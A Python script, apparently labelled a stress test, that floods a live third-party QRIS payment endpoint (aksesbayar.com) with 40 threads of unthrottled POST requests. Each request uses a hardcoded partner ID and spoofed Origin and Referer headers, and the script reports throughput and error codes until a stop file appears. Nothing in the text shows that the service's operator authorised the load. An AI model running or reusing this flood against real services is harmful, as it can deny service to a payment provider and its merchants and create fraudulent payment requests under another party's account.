#!/usr/bin/env python3
"""NXS aksesbayar QRIS flood — stop: create STOP_STRESS or user bilang stop."""
import os
import sys
import time
import threading
from collections import Counter

import requests

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

BASE = os.path.dirname(os.path.abspath(__file__))
STOP = os.path.join(BASE, "STOP_STRESS")
URL = "https://aksesbayar.com/wl/qris"
PID = "4b088d55-37d6-4dc4-892c-fa3504c9fb2a"
AMOUNT = 20000  # 1000 = 422 Invalid Amount; min 20000, kelipatan 1000
WORKERS = 40
TIMEOUT = 8

lock = threading.Lock()
ok = fail = 0
codes = Counter()
lat_ms = 0.0
t0 = time.time()
stop_flag = False


def one():
    global ok, fail, lat_ms
    s = requests.Session()
    payload = {
        "amount": AMOUNT,
        "partnerId": PID,
        "memberName": "stresstest",
    }
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "Accept": "application/json",
        "Origin": "https://aksesbayar.com",
        "Referer": "https://aksesbayar.com/wl/nxs.js",
    }
    while not stop_flag:
        if os.path.exists(STOP):
            break
        t = time.time()
        try:
            r = s.post(URL, json=payload, headers=headers, timeout=TIMEOUT)
            ms = (time.time() - t) * 1000
            sc = r.status_code
            good = sc == 200
        except Exception as e:
            ms = (time.time() - t) * 1000
            sc = type(e).__name__
            good = False
        with lock:
            if good:
                ok += 1
            else:
                fail += 1
            codes[str(sc)] += 1
            lat_ms += ms


def ticker():
    last_ok = last_fail = 0
    last_t = time.time()
    while not stop_flag:
        time.sleep(1)
        now = time.time()
        with lock:
            o, f = ok, fail
            snapshot = dict(codes)
            lat = lat_ms
        dt = max(now - last_t, 0.001)
        rps = (o + f - last_ok - last_fail) / dt
        tot = o + f
        avg = (lat / tot) if tot else 0
        elapsed = int(now - t0)
        print(
            f"[NXS-STRESS] t={elapsed}s rps={rps:.1f} ok={o} fail={f} "
            f"avg_ms={avg:.0f} codes={snapshot}",
            flush=True,
        )
        last_ok, last_fail, last_t = o, f, now
        if os.path.exists(STOP):
            break


def main():
    global stop_flag
    if os.path.exists(STOP):
        os.remove(STOP)
    print(
        f"[NXS-STRESS] START amount={AMOUNT} workers={WORKERS} "
        f"(1000 ditolak API; min 20rb). bilang stop / buat {STOP}",
        flush=True,
    )
    threads = [threading.Thread(target=one, daemon=True) for _ in range(WORKERS)]
    for th in threads:
        th.start()
    tk = threading.Thread(target=ticker, daemon=True)
    tk.start()
    try:
        while True:
            if os.path.exists(STOP):
                break
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass
    stop_flag = True
    print("[NXS-STRESS] STOP requested", flush=True)
    time.sleep(1.2)
    tot = ok + fail
    print(f"[NXS-STRESS] DONE ok={ok} fail={fail} total={tot}", flush=True)


if __name__ == "__main__":
    main()
